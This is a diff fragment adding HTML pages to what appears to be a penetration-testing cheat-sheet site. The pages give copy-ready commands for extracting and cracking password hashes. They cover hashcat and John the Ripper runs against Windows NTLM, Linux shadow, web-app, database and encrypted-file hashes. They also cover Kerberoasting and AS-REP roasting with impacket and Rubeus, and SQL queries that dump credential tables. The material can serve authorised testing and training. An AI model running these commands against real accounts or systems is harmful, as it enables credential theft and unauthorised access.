+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule</div><div class="payload-desc">Aggressive 30k rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m 1000 ntlm.hash '?u?l?l?l?l?l?d?d?s' --increment --increment-min=8</div><div class="payload-desc">Mask: Ulllllldd! (common AD policy)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 6 -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt '?d?d?d?s'</div><div class="payload-desc">Hybrid: word + 3 digits + special (password123!)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1000 secretsdump.txt rockyou.txt --username</div><div class="payload-desc">Crack secretsdump output (MUST use --username flag!)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.hash</div><div class="payload-desc">JtR alternative</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="info-box warn">secretsdump format: user:RID:LMhash:NThash::: — field 4 is the NTLM. Without --username hashcat fails SILENTLY.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4E1; Net-NTLMv2 (Mode 5600)</div><span class="tag tag-orange">RESPONDER</span></div>
+    <div class="card-body">
+      <div class="info-box">Captured via Responder/MITM. Format: user::DOMAIN:challenge:response:blob. CANNOT be used for Pass-the-Hash — must be cracked.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack Net-NTLMv2</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</div><div class="payload-desc">With rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.hash</div><div class="payload-desc">JtR auto-detects netntlmv2</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F427; Linux — sha512crypt $6$ (Mode 1800)</div><span class="tag tag-amber">DEFAULT</span></div>
+    <div class="card-body">
+      <div class="info-box">Default on most modern Linux distros. Salted + many rounds = SLOW to crack. Extract from /etc/shadow (root required).</div>
+      <div class="payload-item"><div><div class="payload-code">unshadow /etc/passwd /etc/shadow > unshadowed.hash</div><div class="payload-desc">Step 1: Combine passwd + shadow</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1800 unshadowed.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack sha512crypt (slow — use GPU)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1800 unshadowed.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</div><div class="payload-desc">With rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hash</div><div class="payload-desc">JtR auto-detects</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4CA; All Linux Hash Types</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Prefix</th><th>Algorithm</th><th>Hashcat</th><th>JtR</th><th>Crack Command</th></tr>
+        <tr><td class="cmd">$1$</td><td>md5crypt</td><td>500</td><td>md5crypt</td><td class="cmd">hashcat -m 500 hash.txt rockyou.txt</td></tr>
+        <tr><td class="cmd">$2a$/$2y$</td><td>bcrypt</td><td>3200</td><td>bcrypt</td><td class="cmd">hashcat -m 3200 hash.txt rockyou.txt</td></tr>
+        <tr><td class="cmd">$5$</td><td>sha256crypt</td><td>7400</td><td>sha256crypt</td><td class="cmd">hashcat -m 7400 hash.txt rockyou.txt</td></tr>
+        <tr><td class="cmd">$6$</td><td>sha512crypt</td><td>1800</td><td>sha512crypt</td><td class="cmd">hashcat -m 1800 hash.txt rockyou.txt</td></tr>
+        <tr><td class="cmd">$y$</td><td>yescrypt</td><td>N/A</td><td>yescrypt</td><td class="cmd">john --format=yescrypt --wordlist=rockyou.txt hash.txt</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F6E1; DCC2 — Domain Cached Creds v2 (Mode 2100)</div><span class="tag tag-purple">VERY SLOW</span></div>
+    <div class="card-body">
+      <div class="info-box warn">Cached credentials on domain-joined Windows machines. PBKDF2-based = extremely slow to crack. Extracted via secretsdump with -history flag or Mimikatz lsadump::cache.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack DCC2 (very slow, small wordlists recommended)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --format=mscach2 --wordlist=/usr/share/wordlists/rockyou.txt dcc2.hash</div><div class="payload-desc">JtR alternative</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: WEB HASHES ============= -->
+<div class="page" id="page-web-hashes">
+  <div class="section-header">
+    <h1>&#x1F310; Web & Application Hashes</h1>
+    <p>WordPress, Drupal, Joomla, Django, Flask, phpBB, and more.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">WordPress — phpass $P$ (Mode 400)</div><span class="tag tag-blue">VERY COMMON</span></div>
+    <div class="card-body">
+      <div class="info-box">WordPress uses phpass (portable PHP hashing). Extract from wp_users table. Format: $P$B... or $H$...</div>
+      <div class="payload-item"><div><div class="payload-code">SELECT user_login,user_pass FROM wp_users;</div><div class="payload-desc">Extract from WordPress database</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 400 wp.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack WordPress hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 400 wp.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</div><div class="payload-desc">With rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp.hash</div><div class="payload-desc">JtR alternative</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">Drupal 7 — $S$ (Mode 7900)</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">SELECT name,pass FROM users;</div><div class="payload-desc">Extract from Drupal database</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 7900 drupal.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack Drupal 7 hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">Joomla (Mode 11)</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">SELECT username,password FROM jos_users;</div><div class="payload-desc">Extract — format is HASH:SALT</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 11 joomla.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack Joomla</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">Django PBKDF2-SHA256 (Mode 10000)</div></div>
+    <div class="card-body">
+      <div class="info-box">Format: pbkdf2_sha256$iterations$salt$hash. Very slow to crack.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 10000 django.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack Django PBKDF2</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">JWT — HS256/384/512 (Mode 16500)</div></div>
+    <div class="card-body">
+      <div class="info-box">Only crackable if signed with HMAC (symmetric key). RS256/ES256 use asymmetric keys and CANNOT be brute-forced.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack JWT secret — input is the full token (header.payload.signature)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: AD HASHES ============= -->
+<div class="page" id="page-ad-hashes">
+  <div class="section-header">
+    <h1>&#x1F3E2; Active Directory & Kerberos Hashes</h1>
+    <p>Kerberoast, AS-REP Roast, DCC2, and other AD-specific hashes.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">Kerberoast TGS-REP (Mode 13100)</div><span class="tag tag-red">CRITICAL</span></div>
+    <div class="card-body">
+      <div class="info-box">Any domain user can request TGS tickets for accounts with SPNs. The ticket is encrypted with the service account's password hash — crack offline.</div>
+      <div class="payload-item"><div><div class="payload-code">impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/user:password -request -outputfile tgs.hash</div><div class="payload-desc">Step 1: Request TGS from Linux</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">Rubeus.exe kerberoast /outfile:tgs.hash</div><div class="payload-desc">Step 1 (Windows): Kerberoast with Rubeus</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</div><div class="payload-desc">Step 2: Crack TGS-REP with rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule</div><div class="payload-desc">Aggressive rules if best64 fails</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash</div><div class="payload-desc">JtR alternative</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">Kerberoast AES (Mode 19700)</div><span class="tag tag-purple">ETYPE 17/18</span></div>
+    <div class="card-body">
+      <div class="info-box warn">AES-encrypted TGS tickets are MUCH slower to crack than RC4 (mode 13100). If possible, downgrade to RC4 during the request.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 19700 tgs_aes.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack AES Kerberoast (etype 18)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">Rubeus.exe kerberoast /tgtdeleg /outfile:tgs.hash</div><div class="payload-desc">Force RC4 downgrade with /tgtdeleg (if supported)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">AS-REP Roast (Mode 18200)</div></div>
+    <div class="card-body">
+      <div class="info-box">Targets accounts with "Do not require Kerberos pre-authentication". No credentials needed to attack — just valid usernames.</div>
+      <div class="payload-item"><div><div class="payload-code">impacket-GetNPUsers -dc-ip DC_IP DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hash</div><div class="payload-desc">Step 1: Get AS-REP from Linux (no creds needed)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash</div><div class="payload-desc">Step 1 (Windows): AS-REP Roast with Rubeus</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</div><div class="payload-desc">Step 2: Crack AS-REP</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash</div><div class="payload-desc">JtR alternative</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: FILE HASHES ============= -->
+<div class="page" id="page-file-hashes">
+  <div class="section-header">
+    <h1>&#x1F4C1; File Hashes</h1>
+    <p>Crack protected files: ZIP, PDF, Office, SSH keys, KeePass, BitLocker, RAR, 7z, GPG, WPA.</p>
+  </div>
+
+  <div class="info-box"><strong>Workflow:</strong> Find encrypted file &#x2192; use *2john to extract hash &#x2192; identify Hashcat mode &#x2192; crack with wordlist + rules.</div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F510; KeePass (.kdbx) — Mode 13400</div><span class="tag tag-amber">SLOW</span></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">keepass2john Database.kdbx > keepass.hash</div><div class="payload-desc">Extract hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">sed -i 's/^Database://' keepass.hash</div><div class="payload-desc">Remove "Database:" prefix (required for Hashcat!)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force</div><div class="payload-desc">Crack KeePass</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash</div><div class="payload-desc">JtR (can use output directly, no sed needed)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F511; SSH Private Key — Mode 22911-22951</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">ssh2john id_rsa > ssh.hash</div><div class="payload-desc">Extract hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash</div><div class="payload-desc">JtR (RECOMMENDED — handles all SSH key formats including aes-256-ctr)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force</div><div class="payload-desc">Hashcat (may fail on modern keys — use JtR as fallback)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="info-box warn">Modern SSH keys use aes-256-ctr cipher which Hashcat may not support. JtR is the safer choice for SSH keys.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4E6; ZIP — Mode 13600 / 17200</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">zip2john archive.zip > zip.hash</div><div class="payload-desc">Extract hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack WinZip</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash</div><div class="payload-desc">JtR auto-detects ZIP format</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4C4; PDF — Mode 10500/10600/10700</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">pdf2john.py document.pdf > pdf.hash</div><div class="payload-desc">Extract hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash</div><div class="payload-desc">JtR (auto-detects PDF version)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 10500 pdf.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Hashcat PDF 1.4-1.6</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4DD; MS Office — Mode 9400-9600</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">office2john.py Protected.docx > office.hash</div><div class="payload-desc">Extract hash</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">john --wordlist=/usr/share/wordlists/rockyou.txt office.hash</div><div class="payload-desc">JtR</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 9600 office.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Hashcat (Office 2013+)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4BF; BitLocker — Mode 22100</div><span class="tag tag-red">VERY SLOW</span></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">bitlocker2john -i Backup.vhd > backup.hashes</div><div class="payload-desc">Extract hashes from BitLocker VHD</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">grep "bitlocker\$0" backup.hashes > backup.hash</div><div class="payload-desc">Filter for password hash ($0 = password, $1/$2/$3 = recovery key)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack BitLocker (extremely slow ~25 H/s CPU, ~9 KH/s GPU)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4E6; RAR / 7z / GPG / PuTTY / WPA</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">rar2john archive.rar > rar.hash && john --wordlist=rockyou.txt rar.hash</div><div class="payload-desc">RAR archive</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">7z2john.pl archive.7z > 7z.hash && john --wordlist=rockyou.txt 7z.hash</div><div class="payload-desc">7-Zip archive</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">gpg2john file.gpg > gpg.hash && john --wordlist=rockyou.txt gpg.hash</div><div class="payload-desc">GPG encrypted file</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">putty2john key.ppk > putty.hash && john --wordlist=rockyou.txt putty.hash</div><div class="payload-desc">PuTTY private key</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hcxpcapngtool -o wpa.hash capture.pcapng</div><div class="payload-desc">Convert WPA capture to hashcat format (mode 22000)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 22000 wpa.hash /usr/share/wordlists/rockyou.txt</div><div class="payload-desc">Crack WPA/WPA2</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: DB HASHES ============= -->
+<div class="page" id="page-db-hashes">
+  <div class="section-header">
+    <h1>&#x1F5C4; Database Hashes</h1>
+    <p>MySQL, MSSQL, PostgreSQL, Oracle, MongoDB — extraction and cracking.</p>
+  </div>
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4CA; Database Hash Reference</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Database</th><th>Mode</th><th>Format</th><th>Extract Command</th><th>Crack Command</th></tr>
+        <tr><td class="tool">MySQL 3.x</td><td>200</td><td>16 hex chars</td><td class="cmd">SELECT user,password FROM mysql.user</td><td class="cmd">hashcat -m 200 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">MySQL 4.1+</td><td>300</td><td>*41 hex chars</td><td class="cmd">SELECT user,authentication_string FROM mysql.user</td><td class="cmd">hashcat -m 300 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">PostgreSQL</td><td>12</td><td>md5+username</td><td class="cmd">SELECT usename,passwd FROM pg_shadow</td><td class="cmd">hashcat -m 12 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">MSSQL 2005</td><td>132</td><td>0x0100...</td><td class="cmd">SELECT name,password_hash FROM sys.sql_logins</td><td class="cmd">hashcat -m 132 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">MSSQL 2012+</td><td>1731</td><td>0x0200...</td><td class="cmd">SELECT name,password_hash FROM sys.sql_logins</td><td class="cmd">hashcat -m 1731 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">Oracle 11g+</td><td>112</td><td>hash:salt</td><td class="cmd">SELECT username,password FROM dba_users</td><td class="cmd">hashcat -m 112 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">MongoDB SCRAM</td><td>24100</td><td>SCRAM-SHA-1</td><td class="cmd">db.system.users.find()</td><td class="cmd">hashcat -m 24100 hash.txt rockyou.txt</td></tr>
+      </table>
+      <div class="info-box" style="margin-top:8px">PostgreSQL MD5 = md5(password+username) — username MUST be included. MySQL leading * must be stripped for some modes.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: CRYPTO HASHES ============= -->
+<div class="page" id="page-crypto-hashes">
+  <div class="section-header">
+    <h1>&#x1F512; Crypto & Raw Hashes</h1>
+    <p>MD5, SHA-1, SHA-256, SHA-512, HMAC, salted variants, and more.</p>
+  </div>
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F512; Raw Hash Reference</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Type</th><th>Length</th><th>Hashcat Mode</th><th>JtR Format</th><th>Crack Command</th></tr>
+        <tr><td class="tool">MD5</td><td>32 hex</td><td>0</td><td>raw-md5</td><td class="cmd">hashcat -m 0 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">MD4</td><td>32 hex</td><td>900</td><td>raw-md4</td><td class="cmd">hashcat -m 900 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">SHA-1</td><td>40 hex</td><td>100</td><td>raw-sha1</td><td class="cmd">hashcat -m 100 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">SHA-256</td><td>64 hex</td><td>1400</td><td>raw-sha256</td><td class="cmd">hashcat -m 1400 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">SHA-512</td><td>128 hex</td><td>1700</td><td>raw-sha512</td><td class="cmd">hashcat -m 1700 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">SHA1($salt.$pass)</td><td>40 hex:salt</td><td>110</td><td>—</td><td class="cmd">hashcat -m 110 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">SHA256($salt.$pass)</td><td>64 hex:salt</td><td>1410</td><td>—</td><td class="cmd">hashcat -m 1410 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">SHA512($salt.$pass)</td><td>128 hex:salt</td><td>1710</td><td>—</td><td class="cmd">hashcat -m 1710 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">md5($salt.$pass)</td><td>32 hex:salt</td><td>10</td><td>—</td><td class="cmd">hashcat -m 10 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">md5($pass.$salt)</td><td>32 hex:salt</td><td>20</td><td>—</td><td class="cmd">hashcat -m 20 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">HMAC-SHA256</td><td>64 hex</td><td>1450</td><td>—</td><td class="cmd">hashcat -m 1450 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">HMAC-SHA512</td><td>128 hex</td><td>1750</td><td>—</td><td class="cmd">hashcat -m 1750 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">HMAC-MD5</td><td>32 hex</td><td>50</td><td>—</td><td class="cmd">hashcat -m 50 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">Cisco Type 5</td><td>$1$...</td><td>500</td><td>md5crypt</td><td class="cmd">hashcat -m 500 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">Cisco Type 8</td><td>$8$...</td><td>9200</td><td>—</td><td class="cmd">hashcat -m 9200 hash.txt rockyou.txt</td></tr>
+        <tr><td class="tool">Cisco Type 9</td><td>$9$...</td><td>9300</td><td>—</td><td class="cmd">hashcat -m 9300 hash.txt rockyou.txt</td></tr>
+      </table>
+      <div class="info-box" style="margin-top:8px">Cisco Type 7 is NOT a hash — it's trivially reversible XOR. Use online decoder. Salted hash format for hashcat: hash:salt (colon-separated).</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: EXTRACTION ============= -->
+<div class="page" id="page-extraction">
+  <div class="section-header">
+    <h1>&#x1F9F0; Hash Extraction</h1>
+    <p>Complete *2john script reference + OS/AD hash extraction commands.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F9F0; Complete *2john Script Table</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">locate *2john*</div><div class="payload-desc">Find all available 2john scripts on your system</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <table class="ref-table" style="margin-top:10px">
+        <tr><th>Tool</th><th>Input</th><th>Command</th><th>Hashcat Mode</th></tr>
+        <tr><td class="tool">keepass2john</td><td>KeePass .kdbx</td><td class="cmd">keepass2john Database.kdbx > kp.hash</td><td>13400</td></tr>
+        <tr><td class="tool">ssh2john</td><td>SSH private key</td><td class="cmd">ssh2john id_rsa > ssh.hash</td><td>22911-22951</td></tr>
